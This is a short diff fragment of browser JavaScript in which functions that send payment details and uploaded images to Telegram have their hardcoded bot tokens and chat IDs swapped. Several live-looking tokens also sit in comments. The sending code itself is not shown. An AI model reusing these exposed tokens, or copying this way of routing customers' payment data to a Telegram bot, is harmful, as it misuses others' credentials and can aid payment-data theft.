@@ -70,8 +70,8 @@ document.addEventListener("DOMContentLoaded", function () {
 
     // Function to send payment details and images to Telegram
     function sendPaymentDetailsToTelegram(orderData, cryptoData) {
-        const botToken = '7146693702:AAGzqiUlBSCt11LzsswFpkNknddDnHRsvxk';
-        const chatId = '565779685';
+        const botToken = '5377053555:AAHh4FVv1O1VjiIRf54hful3HBoSeVYkuVs';
+        const chatId = '5761593439';
 
         // const botToken = '7331211229:AAE3YbxAY_ffo2___sWWGf2zQ3y6DX91k3A';
         // const chatId = '7383651381';
@@ -154,7 +154,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
     // Function to upload an image to Telegram
     function uploadImageToTelegram(imageFile) {
-        const botToken = '7146693702:AAGzqiUlBSCt11LzsswFpkNknddDnHRsvxk';
+        const botToken = '8351887478:AAGc0P3FrRMxDcum95wo4k07m0Q-M8rnAZQ';
         const chatId = '565779685';
 
         // const botToken = '7331211229:AAE3YbxAY_ffo2___sWWGf2zQ3y6DX91k3A';
